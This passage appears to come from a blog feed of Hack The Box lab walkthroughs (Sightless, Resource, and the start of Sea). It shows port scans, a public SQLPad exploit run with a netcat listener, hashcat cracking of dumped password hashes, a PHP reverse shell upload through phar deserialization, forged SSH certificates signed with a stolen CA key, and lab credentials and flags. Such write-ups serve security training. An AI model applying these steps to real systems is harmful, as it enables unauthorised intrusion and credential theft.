+sshd:*:19889:0:99999:7:::
+systemd-coredump:!!:19889::::::
+rosa:$6$giyD4I2YumzG4k6.$0h0Gtrjj13qoK6m0XevedDBanbEz6BStzsLwUtrDm5sVkmnHOSSWF8f6W8B9btTEzyskmA2h/7F7gyvX1fzrT0:19893:0:99999:7:::
+lxd:!:19889::::::
+app:$6$XUL17hADm4qICsPv$QvCHMOImUTmS1jiaTQ2t6ZJtDAzgkqRhFYOMd0nty3lLwpyxTiyMWRgO/jbySPENinpJlL0z3MK1OVEaG44sQ1:19890:0:99999:7:::
+_laurel:!:20007::::::
+
+</code></pre></div><p>Got the root flag, but let&rsquo;s try to crack root password anyway</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB Seasonal: Sightless</title>
+            <link>/posts/sightless/</link>
+            <pubDate>Wed, 23 Oct 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/sightless/</guid>
+            <description>Port Scanning
+# Nmap 7.94SVN scan initiated Sat Oct 19 07:30:38 2024 as: nmap -sC -sV -A -T4 -o port_scan 10.10.11.32 Nmap scan report for 10.10.11.32 Host is up (0.055s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32] | Invalid command: try being more creative |_ Invalid command: try being more creative 22/tcp open ssh OpenSSH 8.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/3c53323d2941b4f7ea6cae026cd9a5fe.jpg" alt=""></p>
+<p><strong>Port Scanning</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Nmap 7.94SVN scan initiated Sat Oct 19 07:30:38 2024 as: nmap -sC -sV -A -T4 -o port_scan 10.10.11.32</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.32
+Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     <span style="color:#ae81ff">220</span> ProFTPD Server <span style="color:#f92672">(</span>sightless.htb FTP Server<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>::ffff:10.10.11.32<span style="color:#f92672">]</span>
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">256</span> c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Did not follow redirect to http://sightless.htb/
+|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/19%Time<span style="color:#f92672">=</span>6713986B%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>
+SF:GenericLines,A0,<span style="color:#e6db74">&#34;220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
+</span><span style="color:#e6db74">SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2
+</span><span style="color:#e6db74">SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
+</span><span style="color:#e6db74">SF:x20being\x20more\x20creative\r\n&#34;</span><span style="color:#f92672">)</span>;
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Oct 19 07:31:50 2024 -- 1 IP address (1 host up) scanned in 72.13 seconds</span>
+
+</code></pre></div><p>On port 80 you can find:
+<img src="attachment/8db1342a35138b47d996fa54bd247351.png" alt=""></p>
+<p>Go trough SQLPad pushing on start now and you&rsquo;ll be redirected to SQLPAD console and you can fetch SQLPad version:</p>
+<p><img src="attachment/9b1808231436cb591e9d9f85527fdd63.png" alt=""></p>
+<p>**Version 6.10.0 identified, let&rsquo;s try find out something about:</p>
+<p><img src="attachment/2bf35d48995bbaeef6b26b37d2d20de1.png" alt=""></p>
+<p>URL: <a href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/tree/main">https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/tree/main</a></p>
+<p>Let&rsquo;s clone the repository and try to run the exploit, while listening on a wished port from another terminal:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless/sqlpad-rce-exploit-CVE-2022-0944<span style="color:#f92672">]</span>
+└─$ python3 exploit.py http://sqlpad.sightless.htb 10.10.14.113 <span style="color:#ae81ff">9091</span>
+---------------------------------------------------------------------
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless<span style="color:#f92672">]</span>
+└─$ nc -lnvp <span style="color:#ae81ff">9091</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9091</span> ...
+</code></pre></div><p>And got the shell:</p>
+<p><img src="attachment/fe342ce104a9a7cfb82690372af1f7f2.png" alt=""></p>
+<p>There&rsquo;s a file sqlpad.sqlite:
+<img src="attachment/9ee6825e92c38020c4d8b7f7fbb9f070.png" alt=""></p>
+<p>In this file are present some interesting parts:</p>
+<pre tabindex="0"><code>admin@sightless.htbadmin$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.
+����1john@sightless.htb3        admin@sightless.htb
+</code></pre><p>Meanwhile try to run a linpeas on sqlpad machine:
+<img src="attachment/cb5e7e14d62ecb6a8111c1d31d0440bd.png" alt=""></p>
+<p><img src="attachment/a0f88f95ba5694f4e5d41dc034b8ce87.png" alt=""></p>
+<p>There&rsquo;s an hash for user <strong>micheal</strong> in passwd file:</p>
+<pre tabindex="0"><code>michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7::
+</code></pre><p>Try to crack it with hashcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless<span style="color:#f92672">]</span>
+└─$ <span style="color:#75715e"># Example command for Hashcat</span>
+hashcat -m <span style="color:#ae81ff">1800</span> -a <span style="color:#ae81ff">0</span> -o cracked_micheal_hash.txt micheal_user_hash /usr/share/wordlists/rockyou.txt
+hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
+......
+Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">0</span> MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: <span style="color:#ae81ff">14344384</span>
+* Bytes.....: <span style="color:#ae81ff">139921497</span>
+* Keyspace..: <span style="color:#ae81ff">14344384</span>
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length <span style="color:#f92672">(</span>usually down to 32<span style="color:#f92672">)</span>.
+
+* Append -w <span style="color:#ae81ff">3</span> to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better <span style="color:#66d9ef">for</span> specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: <span style="color:#ae81ff">1800</span> <span style="color:#f92672">(</span>sha512crypt $6$, SHA512 <span style="color:#f92672">(</span>Unix<span style="color:#f92672">))</span>
+Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
+Time.Started.....: Sat Oct <span style="color:#ae81ff">19</span> 08:58:04 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">43</span> secs<span style="color:#f92672">)</span>
+Time.Estimated...: Sat Oct <span style="color:#ae81ff">19</span> 08:58:47 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+Speed.#1.........:     <span style="color:#ae81ff">1344</span> H/s <span style="color:#f92672">(</span>8.77ms<span style="color:#f92672">)</span> @ Accel:64 Loops:1024 Thr:1 Vec:4
+Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
+Progress.........: 58496/14344384 <span style="color:#f92672">(</span>0.41%<span style="color:#f92672">)</span>
+Rejected.........: 0/58496 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+Restore.Point....: 58432/14344384 <span style="color:#f92672">(</span>0.41%<span style="color:#f92672">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: jhoselin -&gt; iloverhys
+Hardware.Mon.#1..: Util: 89%
+
+Started: Sat Oct <span style="color:#ae81ff">19</span> 08:58:02 <span style="color:#ae81ff">2024</span>
+Stopped: Sat Oct <span style="color:#ae81ff">19</span> 08:58:49 <span style="color:#ae81ff">2024</span>
+
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless<span style="color:#f92672">]</span>
+└─$ cat cracked_micheal_hash.txt 
+$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
+
+
+</code></pre></div><p>Try ssh into <strong>michael</strong>:</p>
+<p><img src="attachment/e86b9c94c5913aea4b70e9b7e3fb03cc.png" alt=""></p>
+<pre tabindex="0"><code>userflag:9dc449a3cd76e16166ea0ae08bd65880
+</code></pre><p>By analyzing services running on port:</p>
+<p><img src="attachment/c6a62ceea6e4a4ba4721657b76a164e5.png" alt=""></p>
+<p>During ports forwarding trough SSH i found that there&rsquo;s froxlor running on 8080, but isn&rsquo;t reachable due the missing of it&rsquo;s domain name. Inspecting other ports i found that port 40975 is the port of an available chrome debugger:</p>
+<p><img src="attachment/91d6ba2807b9fbb33ce0dc23bd8ee157.png" alt=""></p>
+<p><img src="attachment/70fff9de0a46ccc3364d2458727d946c.png" alt=""></p>
+<pre tabindex="0"><code>admin:ForlorfroxAdmin
+</code></pre><p><img src="attachment/46aef148daacdeee888551a751e330d5.png" alt=""></p>
+<p><img src="attachment/82f88746687d4741f0f013bf84f1f829.png" alt=""></p>
+<p>After saving the PHPFM configuration disable and enable this by settings panel after querying
+<code>http://127.0.0.1:8080/admin_settings.php?start=phpfpm</code></p>
+<p>Now redo this procedure with the chmod command on id_rsa file just copied:</p>
+<pre tabindex="0"><code>chmod 644 /tmp/id_rsa
+</code></pre><p><img src="attachment/51da7e56b9548e78bc8115eeb77b66b8.png" alt=""></p>
+<p>After a bit the command will be executed and you will be able to use id_rsa to login into root&rsquo;s ssh:</p>
+<p><img src="attachment/b21470aaf193edff2e229c3637135c2c.png" alt=""></p>
+<pre tabindex="0"><code>rootflag: 7a2a1b4afb44130a744827929fe643d3
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>HTB: Resource Seasonal Machine</title>
+            <link>/posts/resource/</link>
+            <pubDate>Tue, 20 Aug 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/resource/</guid>
+            <description>Port Scan
+┌──(kali㉿kali)-[~/HTB/Resource] └─$ cat scan_Complete # Nmap 7.94SVN scan initiated Sun Aug 11 14:52:16 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan_Complete 10.10.11.27 Nmap scan report for 10.10.11.27 Host is up (0.086s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) | ssh-hostkey: | 256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA) |_ 256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519) 2222/tcp open ssh OpenSSH 8.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/3bd70dd5104068e4031e06ac1c61711d.png" alt=""></p>
+<p><strong>Port Scan</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Resource<span style="color:#f92672">]</span>
+└─$ cat scan_Complete 
+<span style="color:#75715e"># Nmap 7.94SVN scan initiated Sun Aug 11 14:52:16 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan_Complete 10.10.11.27</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.27
+Host is up <span style="color:#f92672">(</span>0.086s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">256</span> d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">256</span> f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sun Aug 11 14:52:32 2024 -- 1 IP address (1 host up) scanned in 15.74 seconds</span>
+</code></pre></div><p>Visit <a href="http://itrc.ssg.htb/">http://itrc.ssg.htb/</a></p>
+<p><img src="attachment/712ccf9b98e3eb82338f1bcde7b3513e.png" alt=""></p>
+<p>On this page you can open a ticket uploading a zip file containing a reverse shell script in php. You can exploit phar deserialization to handle the shell generated on revshell generator:</p>
+<p><img src="attachment/f1f2f21551a2817bed9305cd5d124173.png" alt=""></p>
+<p><img src="attachment/c85cade67bf78fd22ea7ffe4c4886d54.png" alt=""></p>
+<p>Upload the file on ticket system and open up its page:</p>
+<p><img src="attachment/f50a4431998e612de3034ff616a90414.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">http://itrc.ssg.htb/?page<span style="color:#f92672">=</span>phar://uploads/0d327960dcada2c40fb3b5c0cc99154b3963ecd4.zip/&lt;phpfilename&gt;
+without php extension
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cd /var/www
+$ ls
+html
+itrc
+$ cd itrc
+$ ls
+admin.php
+api
+assets
+create_ticket.php
+dashboard.php
+db.php
+filter.inc.php
+footer.inc.php
+header.inc.php
+home.php
+index.php
+loggedin.php
+login.php
+logout.php
+register.php
+savefile.inc.php
+ticket.php
+ticket_section.inc.php
+uploads
+$ cat db.php    
+&lt;?php
+$dsn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mysql:host=db;dbname=resourcecenter;&#34;</span>;
+$dbusername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jj&#34;</span>;
+$dbpassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ugEG5rR5SG8uPd&#34;</span>;
+$pdo <span style="color:#f92672">=</span> new PDO<span style="color:#f92672">(</span>$dsn, $dbusername, $dbpassword<span style="color:#f92672">)</span>;
+
+try <span style="color:#f92672">{</span>
+    $pdo-&gt;setAttribute<span style="color:#f92672">(</span>PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION<span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span> catch <span style="color:#f92672">(</span>PDOException $e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    die<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Connection failed: &#34;</span> . $e-&gt;getMessage<span style="color:#f92672">())</span>;
+<span style="color:#f92672">}</span>$ 
+
+</code></pre></div><p>Credentials found here didn&rsquo;t work neither for ssh or others.
+This box looks always broken so i decided to look a writeup and found out that should be present a file in /uploads folder of itrc that i don&rsquo;t have:</p>
+<p><img src="attachment/836cab1aee6922d645e447bf11a51d46.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Credentials:
+msainristil:82yards2closeit
+</code></pre></div><p><img src="attachment/334f5c9284c02ea18b054c4959331e94.png" alt=""></p>
+<p>In the decommisions_old_ca folder there is priv/pub key pair, that we are going to convert into ssh keys.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh-keygen -t rsa -b <span style="color:#ae81ff">2048</span> -f keypair
+ssh-keygen -s ca-itrc -n zzinter -I kali keypair.pub 
+</code></pre></div><p><img src="attachment/865cfe3a7e89dbf3d5425f2b30dc78e3.png" alt=""></p>
+<p>When i was www-data i noted that was a port listening on 127.0.0.11, this usuaylly means that we are in adocker container, so trough linpeas i  had a tip about this. Then i used deepce and got:</p>
+<p><img src="attachment/c3bd47cec612c42278a478ca983b2cd1.png" alt=""></p>
+<p>RABBIT HOLE, try hard on SSH: <a href="https://shivamaharjan.medium.com/ssh-cas-and-principals-630a433d76d6">https://shivamaharjan.medium.com/ssh-cas-and-principals-630a433d76d6</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh-keygen -t ecdsa -C <span style="color:#e6db74">&#34;The CA&#34;</span> -N <span style="color:#e6db74">&#34;&#34;</span> -f root_key
+ssh-keygen -s ./ca-itrc -I CA-signing -n msainristil,zzinter,root -V +1w -z <span style="color:#ae81ff">1</span> ./root_key.pub
+
+Copy with scp generated files and:
+
+──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Resource<span style="color:#f92672">]</span>
+└─$ ssh -o CertificateFile<span style="color:#f92672">=</span>root_key-cert.pub -i root_key root@10.10.11.27            
+Linux itrc 5.15.0-117-generic <span style="color:#75715e">#127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64</span>
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@itrc:~# ls
+</code></pre></div><p>Even if we logged as root, there&rsquo;s no root flag, so download <strong>sign_key_api.sh</strong> file.</p>
+<p><img src="attachment/922daa0e3bdaddd8a0a3093c42c89b9f.png" alt=""></p>
+<p><img src="attachment/09598aa1ce18ac9b5f233eecf3a06a09.png" alt=""></p>
+<p>From zzinter ssh scp this file: <strong>sign_key_api.sh</strong> and modify the file with vim appending <strong>zzinter_temp</strong> and <strong>root_user</strong> as are present in ssh_principals of the box. This is visible generating a public cert for support@ssg.</p>
+<p><img src="attachment/f1ae315604077afbaba6cfce52ee1e7c.png" alt=""></p>
+<p>Now sign the private key we obtained with the script, generating a certificate signed</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Resource/zzinter_keys<span style="color:#f92672">]</span>
+└─$ ./sign_key_api.sh keypair.pub zzinter zzinter_temp &gt; zzinter.cert
+</code></pre></div><p>From a writeup (i needed help) i recover this key that we will use a certificate to generate root ssh-key. Pasted it in root_ssh.cert file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW 
+QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc 
+rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ 
+AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA 
+cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV 
+QBAgM<span style="color:#f92672">=</span>
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div><p>Then login as root on your kali and sign a the private key using this certificate i provided</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/HTB/Resource/zzinter_keys<span style="color:#f92672">]</span>
+└─# ssh-keygen -s root_ssh.cert -z <span style="color:#ae81ff">1</span> -I root -V -1W:forever -n root_user keypair.pub
+Signed user key keypair-cert.pub: id <span style="color:#e6db74">&#34;root&#34;</span> serial <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> root_user valid after 2024-08-13T13:24:56
+┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/HTB/Resource/zzinter_keys<span style="color:#f92672">]</span>
+└─# ssh-keygen -f keypair-cert.pub -e &gt; root_keypair
+┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/HTB/Resource/zzinter_keys<span style="color:#f92672">]</span>
+└─# ssh -o CertificateFile<span style="color:#f92672">=</span>keypair-cert.pub -i keypair root@10.10.11.27 -p <span style="color:#ae81ff">2222</span>
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh-keygen -s root_ssh.cert -z <span style="color:#ae81ff">1</span> -I root -V -1W:forever -n root_user keypair //Extract the pub key from private // OR
+ssh-keygen -s root_ssh.cert -z <span style="color:#ae81ff">1</span> -I root -V -1W:forever -n root_user keypair.pub //Use Directly the pub key
+</code></pre></div><p>This command generates a signed SSH user certificate using the <code>ssh-keygen</code> tool. Here&rsquo;s what each option does:</p>
+<ul>
+<li>-s root_ssh.cert`: specifies the CA certificate file to use for signing (not shown in the output, but assumed to exist).</li>
+<li>-z 1`: specifies the serial number of the certificate (in this case, 1).</li>
+<li><code>-I root</code>: specifies the principal identity of the certificate (in this case, &ldquo;root&rdquo;).</li>
+<li><code>-V -1W:forever</code>: specifies the validity period of the certificate (in this case, forever, starting from the current time).</li>
+<li><code>-n root_user</code>: specifies the username of the certificate (in this case, &ldquo;root_user&rdquo;).</li>
+<li><code>keypair.pub</code>: specifies the output file for the generated public key.</li>
+</ul>
+<p>The resulting certificate is stored in <code>keypair-cert.pub</code>.</p>
+<p><strong>Flags</strong></p>
+<p><img src="attachment/d9314cee50c28c2118e10e586b1ea6b8.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">user: 98a79086fe46218a7edd6abc87eb54f3
+root: 495f767f17cf87214179384c1f145b91
+</code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>HTB: SEA Seasonal Machine</title>
+            <link>/posts/sea/</link>
+            <pubDate>Thu, 08 Aug 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/sea/</guid>
+            <description>Nmap
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 07:55 EDT Nmap scan report for 10.129.27.223 Host is up (0.050s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA) | 256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA) |_ 256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Sea - Home |_http-server-header: Apache/2.4.41 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/c4cc9c4aee6aa0e906e23da81acfe73a.jpg" alt="">
+<strong>Nmap</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-12 07:55 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.129.27.223
+Host is up <span style="color:#f92672">(</span>0.050s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
